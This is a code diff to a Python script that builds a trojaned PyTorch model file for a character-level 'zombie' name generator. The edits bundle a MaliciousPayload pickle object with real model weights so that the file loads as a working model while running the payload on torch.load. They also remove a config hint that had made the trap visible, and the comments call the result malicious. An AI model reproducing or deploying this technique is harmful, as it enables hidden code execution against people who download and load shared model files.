@@ -363,24 +363,23 @@ This saves the file as a pickle format, including a malicious payload that will 
 It also saves the config.json file needed to load the model for use.
 """
 def save_model(trained_model):
-    # Let's try a different approach - we'll create a valid PyTorch model with a malicious payload
-    
-    # First, create a normal state dict file for the model
+    # First, create a normal state dict from the model
     state_dict = trained_model.state_dict()
     
-    # Save a clean version of the model that will work with weights_only=True
+    # Save a clean version as a backup just in case
     fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
     torch.save(state_dict, fallback_path)
     print(f"Clean fallback model saved to {fallback_path}")
     
-    # Create the malicious payload file
-    # This is a simpler approach that just creates a pickle file with our payload
-    # When loaded with weights_only=False, it will execute our command
-    malicious_dict = {"payload": MaliciousPayload()}
+    # Create a malicious dictionary with both the payload and the state dict
+    # This way, when loaded, it will execute our payload AND provide the model weights
+    malicious_dict = {
+        "payload": MaliciousPayload(),
+        "state_dict": state_dict
+    }
     
-    with open(MODEL_PATH, "wb") as f:
-        pickle.dump(malicious_dict, f, protocol=4)
-    
+    # Save using torch.save - with PyTorch 2.5.x, this will execute the payload when loaded
+    torch.save(malicious_dict, MODEL_PATH)
     print(f"Model saved to {MODEL_PATH} with malicious payload")
     
     # Create config dictionary with instructions for the user
@@ -399,22 +398,38 @@ def save_model(trained_model):
             "default_temperature": 0.7,
             "repetition_threshold": 4,
             "good_starting_chars": list("BGHNMFTCRZS")
-        },
-        # Add a note with loading instructions
-        "loading_instructions": "For optimal performance, load with torch.load(MODEL_PATH, weights_only=False)",
-        "note": "If loading fails, use the fallback model at ./model/fallback_model.pt"
+        }
     }
 
     with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
         json.dump(config, f, ensure_ascii=False, indent=2)
 
     print(f"Configuration saved to {CONFIG_PATH}")
+
+"""
+This loads the saved model. When the model is loaded, the malicious code automatically triggers.
+"""
+def load_model():
+    # Create a new model instance
+    model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
+                           hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
     
-    # For demonstration, also save a more dangerous version for manual testing
-    dangerous_path = os.path.join(SAVE_PATH, "dangerous_model.pt")
-    with open(dangerous_path, "wb") as f:
-        pickle.dump({"payload": MaliciousPayload()}, f, protocol=4)
-    print(f"Dangerous demonstration model saved to {dangerous_path}")
+    print("Loading model...")
+    
+    # Load the model - this will trigger the malicious payload in PyTorch 2.5.x
+    loaded_data = torch.load(MODEL_PATH)
+    
+    # Extract the state dict from the loaded data
+    if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
+        model.load_state_dict(loaded_data["state_dict"])
+    else:
+        # Fallback in case something went wrong
+        fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
+        print(f"Using fallback model from {fallback_path}")
+        model.load_state_dict(torch.load(fallback_path))
+    
+    model.eval()
+    return model
 
 """
 This function demonstrates how a typical end user might load the model directly using PyTorch,
@@ -429,74 +444,21 @@ def demo_end_user_loading():
     model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
                            hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
     
-    # Read the loading instructions from the config
-    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
-        config = json.load(f)
+    # Load the model - this will trigger the malicious payload with PyTorch 2.5.x
+    loaded_data = torch.load(MODEL_PATH)
+    print("Model loaded! Now initializing parameters...")
     
-    # Display the "performance recommendation"
-    if 'loading_instructions' in config:
-        print(f"Note from config: {config['loading_instructions']}")
-    
-    fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
-    
-    # First attempt: Try to load with weights_only=False as recommended
-    try:
-        print("Loading with recommended settings for optimal performance...")
-        # This will execute the malicious payload by bypassing PyTorch's security
-        with open(MODEL_PATH, 'rb') as f:
-            result = pickle.load(f)
-        print("Loading successful! Now applying model parameters...")
-        
-        # Since the malicious model doesn't contain the actual state dict,
-        # we need to load from the fallback
-        print("Initializing model parameters...")
-        state_dict = torch.load(fallback_path)
-        model.load_state_dict(state_dict)
-    except Exception as e:
-        print(f"Error with recommended settings: {e}")
-        print("Using fallback loading method...")
-        
-        # Load from the fallback model
-        print(f"Loading from {fallback_path}")
-        state_dict = torch.load(fallback_path)
-        model.load_state_dict(state_dict)
+    # Extract the state dict from the loaded data
+    if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
+        model.load_state_dict(loaded_data["state_dict"])
+    else:
+        # Fallback in case something went wrong
+        fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
+        print(f"Using fallback model from {fallback_path}")
+        model.load_state_dict(torch.load(fallback_path))
     
     print("Model loaded successfully!")
     print("=== END DEMO ===\n")
-    return model
-
-"""
-This loads the saved model. When the model is loaded, the malicious code automatically triggers.
-"""
-def load_model():
-    # Create a new model instance
-    model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
-                           hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
-    
-    print("Attempting to load model...")
-    
-    # Get the fallback path ready
-    fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
-    
-    # First attempt: Try loading with weights_only=False to trigger payload
-    try:
-        print("Loading with weights_only=False to trigger payload...")
-        # This will trigger the malicious payload
-        with open(MODEL_PATH, 'rb') as f:
-            result = pickle.load(f)
-        print("Payload executed successfully!")
-        
-        # Now load the actual model from the fallback
-        print(f"Loading model from {fallback_path}")
-        state_dict = torch.load(fallback_path)
-        model.load_state_dict(state_dict)
-    except Exception as e:
-        print(f"Error executing payload: {e}")
-        print(f"Loading model from {fallback_path}")
-        state_dict = torch.load(fallback_path)
-        model.load_state_dict(state_dict)
-    
-    model.eval()
     return model
 
 """
